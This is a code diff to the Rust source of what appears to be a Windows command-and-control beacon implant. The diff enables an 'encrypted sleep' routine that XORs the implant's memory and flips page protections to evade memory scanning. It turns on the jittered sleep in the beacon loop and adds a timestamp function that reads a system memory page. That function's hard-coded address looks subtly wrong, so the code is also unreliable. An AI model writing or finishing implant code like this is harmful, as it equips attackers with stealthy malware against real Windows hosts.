@@ -71,10 +71,16 @@ unsafe fn get_current_pid() -> u32 {
 }
 
 /**
- * TODO
+ * THIS IS NOT ACCURATE
  * */
 unsafe fn get_rough_timestamp() -> i64 {
-    1
+    let kuser_shared = 0x7FFE000usize as *const u8;
+    // offset 0x14: SystemTime.LowPart, 0x18: SystemTime.High1Time
+    let low = *(kuser_shared.add(0x14) as *const u32) as u64;
+    let high = *(kuser_shared.add(0x18) as *const u32) as u64;
+    let filetime = (high << 32) | low;
+    // convert windwos FILETIME to Unix epoch
+    ((filetime - 116444736000000000) / 10000000) as i64
 }
 
 /**
@@ -293,8 +299,8 @@ unsafe fn beacon_sleep(base_ms: u64, jitter_pct: u8) {
     let delay: i64 = -((actual_ms as i64) * 10000);
     debug!("[BEACON] Sleeping {}ms", actual_ms);
 
-    // TODO: implement encrypted sleep
-    unimplemented!()
+    // use encrypted sleep - xor memory, flip rx -> rw, sleep, flip rw -> rx, decrypt
+    crate::core::sleep::encrypted_sleep(delay);
 }
 
 pub unsafe fn beacon_loop(config: &C2Config) {
@@ -373,7 +379,7 @@ pub unsafe fn beacon_loop(config: &C2Config) {
         }
 
         // Sleep with jitter
-        // beacon_sleep(interval, jitter)
+        beacon_sleep(interval, jitter)
     }
 }
 
